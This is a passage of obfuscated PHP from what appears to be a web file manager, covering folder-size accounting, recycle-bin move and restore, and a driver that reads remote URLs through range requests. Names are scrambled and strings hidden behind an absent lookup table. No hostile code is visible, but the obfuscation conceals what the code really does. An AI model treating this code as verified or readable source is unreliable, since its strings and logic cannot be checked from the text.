$ò‹ËÜ¿Æ; } public function pathInfoByPath($Ñ‡½ûê×, $Ì…ÌçÆó) { $ûë„¿¾ =& $_SERVER[´È¥ö†ö]; $‘à…–©Ş = !$Ì…ÌçÆó ? array() : explode($ûë„¿¾[8], trim($Ì…ÌçÆó, $ûë„¿¾[8])); $»ıíıĞö = $Ñ‡½ûê×; foreach ($‘à…–©Ş as $é£¼ş¦) { $Ò‚ˆšÌƒ = array($ûë„¿¾[192] => $»ıíıĞö, $ûë„¿¾[32] => $é£¼ş¦); $Ô†¹¥Á‹ = $this->field($ûë„¿¾[2292])->where($Ò‚ˆšÌƒ)->select(); if (!$Ô†¹¥Á‹) { return !1; } $Ô†¹¥Á‹ = array_sort_by($Ô†¹¥Á‹, $ûë„¿¾[516]); $»ıíıĞö = $Ô†¹¥Á‹[0][$ûë„¿¾[193]]; } $¤¼›¬ğÉ = $this->sourceInfo($»ıíıĞö); $this->pathInfoFilter($¤¼›¬ğÉ); return $¤¼›¬ğÉ; } protected function updateModifyTime($ñ °Ïµğ) { $¯œ‹ÚŞ =& $_SERVER[´È¥ö†ö]; $·ÏÌ÷Ã“ = defined($¯œ‹ÚŞ[2201]) ? USER_ID : 0; if (!$ñ °Ïµğ) { return; } if (!is_array($ñ °Ïµğ)) { $ñ °Ïµğ = array($ñ °Ïµğ); } foreach ($ñ °Ïµğ as $İ“‘éÑ => $µÏİõé¸) { $ñ °Ïµğ[$İ“‘éÑ] = intval($µÏİõé¸); $this->sourceCacheClear($µÏİõé¸); } $Çááâ‹ï = array($¯œ‹ÚŞ[193] => array($¯œ‹ÚŞ[7], $ñ °Ïµğ)); $­½¤—¯Ú = array($¯œ‹ÚŞ[665] => $·ÏÌ÷Ã“, $¯œ‹ÚŞ[509] => time()); $this->where($Çááâ‹ï)->save($­½¤—¯Ú); } public function folderSizeReset($ê»ß—ù, $ÚÆø“Ë = false) { $Æ³‡ÏŸë =& $_SERVER[´È¥ö†ö]; if ($this->statusIgnoreResetSpace) { return; } $²£ºî‘‚ = $this->sourceInfo($ê»ß—ù); $•ş˜¢Ğ¡ = $Æ³‡ÏŸë[2293] . $ê»ß—ù; CacheLock::lock($•ş˜¢Ğ¡, 20); if ($ÚÆø“Ë === !1) { $this->sourceCacheClear($ê»ß—ù); $²£ºî‘‚ = $this->sourceInfo($ê»ß—ù); $éÄº·ˆÄ = array($Æ³‡ÏŸë[488] => $ê»ß—ù, $Æ³‡ÏŸë[515] => 0); $—Ù—™è = $this->where($éÄº·ˆÄ)->sum($Æ³‡ÏŸë[79]); $ÚÆø“Ë = intval($—Ù—™è) - intval($²£ºî‘‚[$Æ³‡ÏŸë[79]]); } if ($ÚÆø“Ë == 0) { return CacheLock::unlock($•ş˜¢Ğ¡); } $ôü‚ê´› = $this->parentLevelArray($²£ºî‘‚[$Æ³‡ÏŸë[595]]); if (!$ôü‚ê´›) { $ôü‚ê´› = array(); } $ôü‚ê´›[] = $²£ºî‘‚[$Æ³‡ÏŸë[193]]; $éÄº·ˆÄ = array($Æ³‡ÏŸë[193] => array($Æ³‡ÏŸë[503], $ôü‚ê´›)); if ($ÚÆø“Ë < 0) { $éÄº·ˆÄ[$Æ³‡ÏŸë[79]] = array($Æ³‡ÏŸë[1091], abs($ÚÆø“Ë)); } $this->where($éÄº·ˆÄ)->setAdd($Æ³‡ÏŸë[79], $ÚÆø“Ë); CacheLock::unlock($•ş˜¢Ğ¡); $¥ñÙ´×÷ = $Æ³‡ÏŸë[2294] . $²£ºî‘‚[$Æ³‡ÏŸë[190]] . $Æ³‡ÏŸë[4] . $²£ºî‘‚[$Æ³‡ÏŸë[580]]; $î»¦Í™ = array($²£ºî‘‚[$Æ³‡ÏŸë[190]], $²£ºî‘‚[$Æ³‡ÏŸë[580]]); TaskRun::timeLimitCall($¥ñÙ´×÷, $Æ³‡ÏŸë[2295], $î»¦Í™, 1.5); } public function folderSizeResetChildren($óÊµ²È©) { $µ»‡»Õ® =& $_SERVER[´È¥ö†ö]; $this->sourceCacheClear($óÊµ²È©); $µº„ÛğÚ = $this->sourceInfo($óÊµ²È©); $İ÷ÄÕº = array($µ»‡»Õ®[660] => 1, $µ»‡»Õ®[663] => $µº„ÛğÚ[$µ»‡»Õ®[580]], $µ»‡»Õ®[666] => array($µ»‡»Õ®[626], $µº„ÛğÚ[$µ»‡»Õ®[595]] . $óÊµ²È© . $µ»‡»Õ®[627])); $æéäŠåÚ = $µ»‡»Õ®[2296]; $ŞãÃıÑû = $this->field($æéäŠåÚ)->where($İ÷ÄÕº)->select(); $İ÷ÄÕº[$µ»‡»Õ®[496]] = 0; $è‹Ûı‹§ = $this->field($æéäŠåÚ)->where($İ÷ÄÕº)->select(); if (!$è‹Ûı‹§) { return; } $ŞãÃıÑû[] = $µº„ÛğÚ; $ŞãÃıÑû = array_to_keyvalue($ŞãÃıÑû, $µ»‡»Õ®[193]); foreach ($ŞãÃıÑû as $ËõŞ¨£ => $ÁÌËŸıû) { $ŞãÃıÑû[$ËõŞ¨£][$µ»‡»Õ®[2297]] = $ŞãÃıÑû[$ËõŞ¨£][$µ»‡»Õ®[79]]; $ŞãÃıÑû[$ËõŞ¨£][$µ»‡»Õ®[79]] = 0; } foreach ($è‹Ûı‹§ as $ÁÌËŸıû) { $ÇÄ•õŞÄ = $ÁÌËŸıû[$µ»‡»Õ®[192]] . $µ»‡»Õ®[12]; if (!isset($ŞãÃıÑû[$ÇÄ•õŞÄ])) { continue; } if ($ÁÌËŸıû[$µ»‡»Õ®[516]] == $ŞãÃıÑû[$ÇÄ•õŞÄ][$µ»‡»Õ®[516]]) { $ŞãÃıÑû[$ÇÄ•õŞÄ][$µ»‡»Õ®[79]] += $ÁÌËŸıû[$µ»‡»Õ®[79]]; } } foreach ($ŞãÃıÑû as $ÁÌËŸıû) { $ƒÊ¡æÉï = $this->parentLevelArray($ÁÌËŸıû[$µ»‡»Õ®[595]]); foreach ($ƒÊ¡æÉï as $ÇÄ•õŞÄ) { $ÇÄ•õŞÄ = $ÇÄ•õŞÄ . $µ»‡»Õ®[12]; if (!isset($ŞãÃıÑû[$ÇÄ•õŞÄ])) { continue; } if ($ÁÌËŸıû[$µ»‡»Õ®[516]] == $ŞãÃıÑû[$ÇÄ•õŞÄ][$µ»‡»Õ®[516]]) { $ŞãÃıÑû[$ÇÄ•õŞÄ][$µ»‡»Õ®[79]] += $ÁÌËŸıû[$µ»‡»Õ®[79]]; } } } $–òÖ–Ï = array(); foreach ($ŞãÃıÑû as $ÁÌËŸıû) { if ($ÁÌËŸıû[$µ»‡»Õ®[79]] == $ÁÌËŸıû[$µ»‡»Õ®[2297]]) { continue; } $–òÖ–Ï[] = array($µ»‡»Õ®[193], $ÁÌËŸıû[$µ»‡»Õ®[193]], $µ»‡»Õ®[79], $ÁÌËŸıû[$µ»‡»Õ®[79]]); } $this->saveAll($–òÖ–Ï); } public function userSpaceReset($ı¤ÍÂ£Ú = false) { $˜Á“„ =& $_SERVER[´È¥ö†ö]; $œÚ§ıñ = $this->where(array($˜Á“„[190] => self::TYPE_USER, $˜Á“„[580] => $ı¤ÍÂ£Ú, $˜Á“„[496] => 0))->sum($˜Á“„[79]); $œÚ§ıñ = !$œÚ§ıñ || $œÚ§ıñ <= 0 ? 0 : $œÚ§ıñ; Model($˜Á“„[588])->userEdit($ı¤ÍÂ£Ú, array($˜Á“„[1962] => $œÚ§ıñ)); } public function targetSpaceUpdate($çùä„ïı, $™ˆöæøÂ) { $ëöÎõí =& $_SERVER[´È¥ö†ö]; if (!$™ˆöæøÂ) { return; } if (!in_array($çùä„ïı, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¯ëÑÜ÷Ù = $this->targetSpaceSize($çùä„ïı, $™ˆöæøÂ); if ($çùä„ïı == self::TYPE_USER) { Model($ëöÎõí[588])->userEdit($™ˆöæøÂ, array($ëöÎõí[1962] => $¯ëÑÜ÷Ù)); } else { if ($çùä„ïı == self::TYPE_GROUP) { Model($ëöÎõí[596])->groupEdit($™ˆöæøÂ, array($ëöÎõí[1962] => $¯ëÑÜ÷Ù)); } } } public function targetSpaceSize($í÷òŒÆ­, $óŠÎ·¢) { $Ø°ÜóÊÍ =& $_SERVER[´È¥ö†ö]; $ËŞª…Ñ = 0; $ä¨ÄÉ¸Ç = $this->targetSourceRoot($í÷òŒÆ­, $óŠÎ·¢, !0); foreach ($ä¨ÄÉ¸Ç as $ÃŸğÙí³) { if (!$ÃŸğÙí³) { continue; } $ËŞª…Ñ += floatval($ÃŸğÙí³[$Ø°ÜóÊÍ[79]]); $ÎÕ´¸ºª = array($Ø°ÜóÊÍ[666] => array($Ø°ÜóÊÍ[626], $Ø°ÜóÊÍ[604] . $ÃŸğÙí³[$Ø°ÜóÊÍ[193]] . $Ø°ÜóÊÍ[627])); $ö€€à‡Å = Model($Ø°ÜóÊÍ[514])->field($Ø°ÜóÊÍ[502])->where($ÎÕ´¸ºª)->select(); $ö€€à‡Å = array_to_keyvalue($ö€€à‡Å, $Ø°ÜóÊÍ[12], $Ø°ÜóÊÍ[193]); $ö€€à‡Å = array_unique(array_filter($ö€€à‡Å)); if ($ö€€à‡Å) { $ÎÕ´¸ºª = array($Ø°ÜóÊÍ[502] => array($Ø°ÜóÊÍ[503], $ö€€à‡Å)); $ËŞª…Ñ += floatval($this->where($ÎÕ´¸ºª)->sum($Ø°ÜóÊÍ[79])); } } $ËŞª…Ñ = !$ËŞª…Ñ || $ËŞª…Ñ <= 0 ? 0 : $ËŞª…Ñ; return $ËŞª…Ñ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ˆ—²ˆÏº) { return $this->fileTypeProfile($ˆ—²ˆÏº, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ø ñç†Í) { return $this->fileTypeProfile($Ø ñç†Í, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¨Ôµ€¥œ, $®¡‰Ã¥ø) { $òí¥š´Ã =& $_SERVER[´È¥ö†ö]; $”Öƒ¡¶ö = $òí¥š´Ã[2298] . $¨Ôµ€¥œ . $òí¥š´Ã[11] . $®¡‰Ã¥ø; $ëûÎºõÆ = Cache::get($”Öƒ¡¶ö); if ($ëûÎºõÆ) { return $ëûÎºõÆ; } $±ª®¤¾ş = array($òí¥š´Ã[660] => 0); if ($¨Ôµ€¥œ != !1) { $±ª®¤¾ş[$òí¥š´Ã[580]] = $¨Ôµ€¥œ; $±ª®¤¾ş[$òí¥š´Ã[190]] = $®¡‰Ã¥ø; } $ŠÚÁ˜±õ = array(); $ŠÚÁ˜±õ[$òí¥š´Ã[2299]] = array($òí¥š´Ã[2300] => LNG($òí¥š´Ã[2299]), $òí¥š´Ã[2301] => $this->where($±ª®¤¾ş)->count(), $òí¥š´Ã[631] => $this->where($±ª®¤¾ş)->sum($òí¥š´Ã[79])); $ïµ°æûÔ = KodIO::fileTypeList(); foreach ($ïµ°æûÔ as $‘ÈÒÌäÎ => $çİ³«ŸÛ) { $±ª®¤¾ş[$òí¥š´Ã[497]] = $this->fileTypeWhere($‘ÈÒÌäÎ); $ŠÚÁ˜±õ[$‘ÈÒÌäÎ] = array($òí¥š´Ã[2300] => $çİ³«ŸÛ[$òí¥š´Ã[32]], $òí¥š´Ã[2301] => $this->where($±ª®¤¾ş)->count(), $òí¥š´Ã[631] => $this->where($±ª®¤¾ş)->sum($òí¥š´Ã[79])); } Cache::set($”Öƒ¡¶ö, $ŠÚÁ˜±õ, 1200); return $ŠÚÁ˜±õ; } public function fileNameExist($–ü©ÔÕæ, $á“øÛÃ) { $ó‘â—â =& $_SERVER[´È¥ö†ö]; $éã¥» = $this->field($ó‘â—â[2302])->where(array($ó‘â—â[192] => $–ü©ÔÕæ, $ó‘â—â[32] => $á“øÛÃ, $ó‘â—â[516] => 0))->find(); return is_array($éã¥») ? $éã¥»[$ó‘â—â[193]] : !1; } public function childList($Ç¬ØÛ×î) { $¢€Üµ’í =& $_SERVER[´È¥ö†ö]; $Äª¶–Ò = $¢€Üµ’í[2275] . $Ç¬ØÛ×î; if (isset(self::$cacheChildList[$Äª¶–Ò])) { return self::$cacheChildList[$Äª¶–Ò]; } $Ûñíá…ã = array($¢€Üµ’í[192] => intval($Ç¬ØÛ×î), $¢€Üµ’í[516] => 0); $Ï”¹„Ø = $this->where($Ûñíá…ã)->select(); $Ï”¹„Ø = $Ï”¹„Ø ? $Ï”¹„Ø : array(); self::$cacheChildList[$Äª¶–Ò] = $Ï”¹„Ø; foreach ($Ï”¹„Ø as $‚º¦şÎÈ) { $Äª¶–Ò = $¢€Üµ’í[544] . $‚º¦şÎÈ[$¢€Üµ’í[193]]; self::$cacheSourceInfo[$Äª¶–Ò] = $‚º¦şÎÈ; } return $Ï”¹„Ø; } public function fileNameAuto($íõòë¥ã, $Üşóˆ×Ó, $ãğà«Îã = REPEAT_RENAME, $Ø¼®ÒûÓ = false) { $èÖ­ùµô =& $_SERVER[´È¥ö†ö]; $ëÕ‚ê®¸ = get_path_ext($Üşóˆ×Ó); $¤¤À¥‡³ = $ëÕ‚ê®¸ ? get_path_ext_name($Üşóˆ×Ó) . $èÖ­ùµô[2303] . $ëÕ‚ê®¸ : $Üşóˆ×Ó . $èÖ­ùµô[471]; $ø¤şİó‚ = array($èÖ­ùµô[192] => $íõòë¥ã, $èÖ­ùµô[516] => 0, $èÖ­ùµô[32] => array($èÖ­ùµô[470], $¤¤À¥‡³)); $‹‚“†âŸ = $this->field($èÖ­ùµô[32])->where($ø¤şİó‚)->select(); $ÏÈáöóÈ = array_to_keyvalue($‹‚“†âŸ, $èÖ­ùµô[12], $èÖ­ùµô[32]); return $this->fileNameAutoGet($ÏÈáöóÈ, $Üşóˆ×Ó, $ãğà«Îã, $Ø¼®ÒûÓ); } public function fileNameAutoGet($›ÍœÉ¢½, $ÎÇ§®¤Î, $èõùËä, $©½“€) { $‰ÏÚÛŠê =& $_SERVER[´È¥ö†ö]; if ($èõùËä == REPEAT_REPLACE || !$›ÍœÉ¢½ || !in_array_not_case($ÎÇ§®¤Î, $›ÍœÉ¢½) || $©½“€ && $èõùËä != REPEAT_RENAME_FOLDER) { return $ÎÇ§®¤Î; } if ($èõùËä == REPEAT_SKIP) { return !1; } $üå˜š¹­ = $‰ÏÚÛŠê[10] . get_path_ext($ÎÇ§®¤Î); $üå˜š¹­ = $üå˜š¹­ == $‰ÏÚÛŠê[10] || $©½“€ ? $‰ÏÚÛŠê[12] : $üå˜š¹­; for ($Áö•ª¼ = 1; $Áö•ª¼ <= count($›ÍœÉ¢½) + 1; $Áö•ª¼++) { $˜»±Üó = substr($ÎÇ§®¤Î, 0, strlen($ÎÇ§®¤Î) - strlen($üå˜š¹­)); $ş€”×ÍÖ = $˜»±Üó . "\x28{$Áö•ª¼}\x29{$üå˜š¹­}"; if (!in_array_not_case($ş€”×ÍÖ, $›ÍœÉ¢½)) { return $ş€”×ÍÖ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\143\x65\x5f\x72\145\143\171\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\x6d\145", "\x74\x69\x6d\145", "\x69\156\163\145\x72\x74", "\x66\165\156\143\x74\151\x6f\x6e")); public function listData($±ğ‡Ÿòù = false) { $¤é¡õßñ =& $_SERVER[´È¥ö†ö]; $±ğ‡Ÿòù = $±ğ‡Ÿòù ? $±ğ‡Ÿòù : USER_ID; $”ŠÈšüÀ = $this->where(array($¤é¡õßñ[1764] => $±ğ‡Ÿòù))->select(); return array_to_keyvalue($”ŠÈšüÀ, $¤é¡õßñ[12], $¤é¡õßñ[193]); } public function moveToRecycle($ÁË‡•²) { $Û‰—Ûœ =& $_SERVER[´È¥ö†ö]; $÷¨¨»õ¶ = Model($Û‰—Ûœ[1420]); $¤ê”ğ = $÷¨¨»õ¶->sourceInfo($ÁË‡•²); if (!$¤ê”ğ || $¤ê”ğ[$Û‰—Ûœ[516]] == $Û‰—Ûœ[91]) { return; } $Ãİ”şİä = array($Û‰—Ûœ[502] => $ÁË‡•², $Û‰—Ûœ[1764] => USER_ID, $Û‰—Ûœ[662] => $¤ê”ğ[$Û‰—Ûœ[190]], $Û‰—Ûœ[663] => $¤ê”ğ[$Û‰—Ûœ[580]], $Û‰—Ûœ[666] => $¤ê”ğ[$Û‰—Ûœ[595]]); $this->add($Ãİ”şİä); $this->recycleMove($ÁË‡•², 1); if ($¤ê”ğ[$Û‰—Ûœ[496]] == $Û‰—Ûœ[91]) { $—°˜Â = array($Û‰—Ûœ[666] => array($Û‰—Ûœ[626], $¤ê”ğ[$Û‰—Ûœ[595]] . $ÁË‡•² . $Û‰—Ûœ[627])); $÷¨¨»õ¶->where($—°˜Â)->setField($Û‰—Ûœ[516], 1); } } public function clear() { $this->remove(!1); } public function remove($š¯î«ƒ = false, $™Ö¼Ô‹œ = false) { $ÙË¤áì¿ =& $_SERVER[´È¥ö†ö]; $™Ö¼Ô‹œ = $™Ö¼Ô‹œ ? $™Ö¼Ô‹œ : USER_ID; $ìøâ—Ã¥ = Model($ÙË¤áì¿[1420]); $¡³äµ¹ = $this->listData($™Ö¼Ô‹œ); $š¯î«ƒ = $š¯î«ƒ === !1 ? !1 : $š¯î«ƒ; $—€ò¶ó = array(); foreach ($¡³äµ¹ as $†ıÄÄœä) { if ($š¯î«ƒ != !1 && !in_array($†ıÄÄœä, $š¯î«ƒ)) { continue; } $şæ„Øªá = $ìøâ—Ã¥->sourceInfo($†ıÄÄœä); $ìøâ—Ã¥->remove($†ıÄÄœä, !1); $á¶á’– = $şæ„Øªá[$ÙË¤áì¿[190]] . $ÙË¤áì¿[11] . $şæ„Øªá[$ÙË¤áì¿[580]]; $—€ò¶ó[$á¶á’–] = array($ÙË¤áì¿[662] => $şæ„Øªá[$ÙË¤áì¿[190]], $ÙË¤áì¿[580] => $şæ„Øªá[$ÙË¤áì¿[580]]); $this->where(array($ÙË¤áì¿[193] => $†ıÄÄœä))->delete(); } foreach ($—€ò¶ó as $’î½˜İ­) { $ìøâ—Ã¥->targetSpaceUpdate($’î½˜İ­[$ÙË¤áì¿[190]], $’î½˜İ­[$ÙË¤áì¿[580]]); } } public function restore($üÌ´¿İ = false) { $¼ù½ß¤î = $this->listData(); $this->_restoreSource($¼ù½ß¤î, $üÌ´¿İ); } public function removeUserAll($ÃÔØŸ…§) { $this->remove(!1, $ÃÔØŸ…§); } public function restoreItem($Î‚à„‡) { $this->_restoreSource(array($Î‚à„‡), array($Î‚à„‡)); } private function _restoreSource($ğ¹ëÃì‘, $Ã•š¶Öì) { $¢î¹·ïö =& $_SERVER[´È¥ö†ö]; $à¼¡ùüà = Model($¢î¹·ïö[1420]); $Ã•š¶Öì = $Ã•š¶Öì == !1 ? !1 : $Ã•š¶Öì; if (!$ğ¹ëÃì‘) { return !0; } $ó’¦èº… = array(); foreach ($ğ¹ëÃì‘ as $½¶øˆñ¤) { if ($Ã•š¶Öì != !1 && !in_array($½¶øˆñ¤, $Ã•š¶Öì)) { continue; } $Î—“ÙÉš = $à¼¡ùüà->sourceInfo($½¶øˆñ¤); $á„¶ÁÄÎ = $à¼¡ùüà->sourceInfo($Î—“ÙÉš[$¢î¹·ïö[192]]); if ($á„¶ÁÄÎ[$¢î¹·ïö[516]] == $¢î¹·ïö[91]) { continue; } $à¼¡ùüà->lockMoveStart($½¶øˆñ¤); $this->recycleMove($½¶øˆñ¤, 0); if ($Î—“ÙÉš[$¢î¹·ïö[496]] == $¢î¹·ïö[91]) { $¦ßØöè = array($¢î¹·ïö[666] => array($¢î¹·ïö[626], $Î—“ÙÉš[$¢î¹·ïö[595]] . $½¶øˆñ¤ . $¢î¹·ïö[627])); $à¼¡ùüà->where($¦ßØöè)->setField($¢î¹·ïö[516], 0); $this->restoreFolderChildren($½¶øˆñ¤, $ğ¹ëÃì‘); } $this->where(array($¢î¹·ïö[193] => $½¶øˆñ¤))->delete(); $à¼¡ùüà->folderSizeReset($Î—“ÙÉš[$¢î¹·ïö[192]]); $ó’¦èº…[] = $Î—“ÙÉš[$¢î¹·ïö[192]]; if ($Î—“ÙÉš[$¢î¹·ïö[496]] == $¢î¹·ïö[91]) { $ó’¦èº…[] = $½¶øˆñ¤; } $à¼¡ùüà->lockMoveEnd($½¶øˆñ¤); } $à¼¡ùüà->updateModifyTime($ó’¦èº…); } private function restoreFolderChildren($‰·ÀÚõ†, $·Ÿ«µĞ) { $œÀ¥ÇŸŞ =& $_SERVER[´È¥ö†ö]; $×­Í±¬Š = Model($œÀ¥ÇŸŞ[1420]); $âÇ’¤Õê = array($œÀ¥ÇŸŞ[193] => array($œÀ¥ÇŸŞ[7], array())); foreach ($·Ÿ«µĞ as $»Åş˜ß÷) { if ($»Åş˜ß÷ == $‰·ÀÚõ†) { continue; } if (!$×­Í±¬Š->isParentOf($‰·ÀÚõ†, $»Åş˜ß÷)) { continue; } $úêä¦é = $×­Í±¬Š->sourceInfo($»Åş˜ß÷); if ($úêä¦é[$œÀ¥ÇŸŞ[496]] == $œÀ¥ÇŸŞ[91]) { $âÇ’¤Õê[] = array($œÀ¥ÇŸŞ[666] => array($œÀ¥ÇŸŞ[626], $úêä¦é[$œÀ¥ÇŸŞ[595]] . $»Åş˜ß÷ . $œÀ¥ÇŸŞ[627])); } else { $âÇ’¤Õê[$œÀ¥ÇŸŞ[193]][1][] = $»Åş˜ß÷; } } if (!$âÇ’¤Õê[$œÀ¥ÇŸŞ[193]][1]) { unset($âÇ’¤Õê[$œÀ¥ÇŸŞ[193]]); } if (!$âÇ’¤Õê) { return; } if (is_array($âÇ’¤Õê[$œÀ¥ÇŸŞ[193]]) && is_array($âÇ’¤Õê[$œÀ¥ÇŸŞ[193]][1])) { $âÇ’¤Õê[$œÀ¥ÇŸŞ[193]][1] = array_unique($âÇ’¤Õê[$œÀ¥ÇŸŞ[193]][1]); } $âÇ’¤Õê[$œÀ¥ÇŸŞ[1076]] = $œÀ¥ÇŸŞ[2076]; $×­Í±¬Š->where($âÇ’¤Õê)->setField($œÀ¥ÇŸŞ[516], 1); } private function recycleMove($¤¿²ÅĞ, $®ä…Áºì = 1) { $¶¿ïÒÅ =& $_SERVER[´È¥ö†ö]; $ÁøŸÃù¹ = Model($¶¿ïÒÅ[1420]); $Ãë¥ÌÌë = Model($¶¿ïÒÅ[2304]); $™–»»Ø  = array($¶¿ïÒÅ[193] => $¤¿²ÅĞ); if ($®ä…Áºì) { $ÁøŸÃù¹->where($™–»»Ø )->setField($¶¿ïÒÅ[516], 1); $Ãë¥ÌÌë->eventRecycle($¤¿²ÅĞ, $¶¿ïÒÅ[2305]); } else { $Ìéìª´Ò = $ÁøŸÃù¹->where($™–»»Ø )->find(); $à’‘Ëññ = $Ìéìª´Ò[$¶¿ïÒÅ[496]] == $¶¿ïÒÅ[91]; $üøåÔÑ = $ÁøŸÃù¹->fileNameAuto($Ìéìª´Ò[$¶¿ïÒÅ[192]], $Ìéìª´Ò[$¶¿ïÒÅ[32]], REPEAT_RENAME_FOLDER, $à’‘Ëññ); if ($üøåÔÑ != $Ìéìª´Ò[$¶¿ïÒÅ[32]]) { $ÁøŸÃù¹->rename($¤¿²ÅĞ, $üøåÔÑ); } $ÁøŸÃù¹->where($™–»»Ø )->setField($¶¿ïÒÅ[516], 0); $Ãë¥ÌÌë->eventRecycle($¤¿²ÅĞ, $¶¿ïÒÅ[2306]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\163\x6f\165\162\x63\145\123\145\143\162\x65\x74\114\151\163\x74"; public $field = array("\163\x6f\165\x72\x63\145\111\104", "\164\171\160\145\111\x44", "\143\x72\145\141\x74\145\125\x73\x65\x72"); } goto e•›ˆªÇîà; D“Ñ¬‘‰: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($…ÌØ³ç  = false) { } public function exist($¸›«¶Ó) { $ø±”€öË = $this->info($¸›«¶Ó); return $ø±”€öË[$_SERVER[´È¥ö†ö][234]]; } public function isFile($éŞ€áÔÖ) { $õ¾öå£É = $this->info($éŞ€áÔÖ); return $õ¾öå£É[$_SERVER[´È¥ö†ö][234]]; } public function isFolder($˜è»¹¢ä) { return !1; } public function size($÷‚ìÈà„) { $ûåÖ ”É = $this->info($÷‚ìÈà„); return $ûåÖ ”É[$_SERVER[´È¥ö†ö][79]]; } public function info($ä¸ßÑ¸î) { return $this->infoParse($ä¸ßÑ¸î); } public function infoAuth($ÜüÕ¢³˜) { return $this->infoParse($ÜüÕ¢³˜); } public function infoWithChildren($ÖëÁÅ´ß) { return $this->infoParse($ÖëÁÅ´ß); } public function infoFull($—„Ì¬£) { return $this->infoParse($—„Ì¬£); } private function infoParse($äŠõÄ÷) { $Ú±ºÙãğ =& $_SERVER[´È¥ö†ö]; $…Ä¢»Â÷ = $this->header($äŠõÄ÷); if (!$…Ä¢»Â÷ || !$…Ä¢»Â÷[$Ú±ºÙãğ[826]]) { return !1; } $ÄéûŸƒ” = _get($…Ä¢»Â÷, $Ú±ºÙãğ[423], 0); $‚‹ø½˜ = array($Ú±ºÙãğ[32] => $…Ä¢»Â÷[$Ú±ºÙãğ[32]], $Ú±ºÙãğ[87] => $äŠõÄ÷, $Ú±ºÙãğ[33] => $Ú±ºÙãğ[232], $Ú±ºÙãğ[79] => intval($ÄéûŸƒ”), $Ú±ºÙãğ[169] => get_path_ext($…Ä¢»Â÷[$Ú±ºÙãğ[32]]), $Ú±ºÙãğ[1455] => $ÄéûŸƒ” > 0 && $…Ä¢»Â÷[$Ú±ºÙãğ[1605]], $Ú±ºÙãğ[1456] => !1); return $‚‹ø½˜; } private function header($¬¶Â°¼Õ) { $Û©ìéË– =& $_SERVER[´È¥ö†ö]; if (isset(self::$_cacheHeader[$¬¶Â°¼Õ])) { return self::$_cacheHeader[$¬¶Â°¼Õ]; } $şëö§ªô = isset($GLOBALS[$Û©ìéË–[1606]]) ? $GLOBALS[$Û©ìéË–[1606]] : !1; $GLOBALS[$Û©ìéË–[1606]] = !0; self::$_cacheHeader[$¬¶Â°¼Õ] = url_header($¬¶Â°¼Õ); $GLOBALS[$Û©ìéË–[1606]] = $şëö§ªô; return self::$_cacheHeader[$¬¶Â°¼Õ]; } public function hashSimple($°…š£¢ï, $Öè†‹Ñø = false) { $»ôÜ—€ =& $_SERVER[´È¥ö†ö]; $øäÓ· = $this->info($°…š£¢ï); if (!$øäÓ· || !$øäÓ·[$»ôÜ—€[234]]) { return !1; } $Î·Ä …Ì = $øäÓ·[$»ôÜ—€[79]]; $´ÜñìÕÖ = 200; $œÖÛÈœÄ = 50; if ($Î·Ä …Ì <= $´ÜñìÕÖ * $œÖÛÈœÄ) { return md5($this->fileSubstr($°…š£¢ï, 0, $Î·Ä …Ì)) . $Î·Ä …Ì; } $£ø²‰êĞ = intval($Î·Ä …Ì / $œÖÛÈœÄ); $óàŞ•Ö¥ = $»ôÜ—€[12]; $–¦”ñ„´ = timeFloat(); $²¾ŞÆëÒ = 15; for ($šÌĞ¹âÑ = 0; $šÌĞ¹âÑ < $œÖÛÈœÄ; $šÌĞ¹âÑ++) { if (timeFloat() - $–¦”ñ„´ > $²¾ŞÆëÒ) { return !1; } $ÚÈ“âÓë = $this->fileSubstr($°…š£¢ï, $£ø²‰êĞ * $šÌĞ¹âÑ, $´ÜñìÕÖ); if (!$ÚÈ“âÓë) { return !1; } $óàŞ•Ö¥ .= $ÚÈ“âÓë; } $óàŞ•Ö¥ .= $this->fileSubstr($°…š£¢ï, $Î·Ä …Ì - $´ÜñìÕÖ, $´ÜñìÕÖ); return md5($óàŞ•Ö¥) . $Î·Ä …Ì; } public function getContent($À€Ëùå) { return $this->fileSubstr($À€Ëùå); } public function fileSubstr($îÍ²è×¡, $ªá‹ï™ = 0, $Åß±¿‹ö = -1) { $°û¶ô‘ =& $_SERVER[´È¥ö†ö]; $Ñ“šˆÀ = $this->info($îÍ²è×¡); if (!$Ñ“šˆÀ || !$Ñ“šˆÀ[$°û¶ô‘[234]] && $Ñ“šˆÀ[$°û¶ô‘[79]] > 1024 * 1024 * 10) { return !1; } if ($Åß±¿‹ö === -1) { $Åß±¿‹ö = $Ñ“šˆÀ[$°û¶ô‘[79]]; } if ($Åß±¿‹ö == 0) { return $°û¶ô‘[12]; } $‘ùÈ”»ë = array($°û¶ô‘[1607] . $ªá‹ï™ . $°û¶ô‘[862] . ($ªá‹ï™ + $Åß±¿‹ö - 1)); $ô¨¹ğŒä = url_request($îÍ²è×¡, $°û¶ô‘[1495], !1, $‘ùÈ”»ë, !1, !1, 30); return $ô¨¹ğŒä[$°û¶ô‘[1286]] ? $ô¨¹ğŒä[$°û¶ô‘[1286]] : $°û¶ô‘[12]; } public function download($ºÅ¯ïá, $êŞÑÜƒ) { Downloader::start($ºÅ¯ïá, $êŞÑÜƒ); return $êŞÑÜƒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÌÍı™í„, $©êêŸÅî = '') { $this->info = $this->info($ÌÍı™í„); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[´È¥ö†ö][87]]; $this->pathOpen = $ÌÍı™í„; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÌÍı™í„])) { self::$_chunkBuffer[$ÌÍı™í„] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($‚°òœÒí) { $£ÂÊ‰¸ = $this->fileSubstr($this->pose, $‚°òœÒí); $this->pose += strlen($£ÂÊ‰¸); return 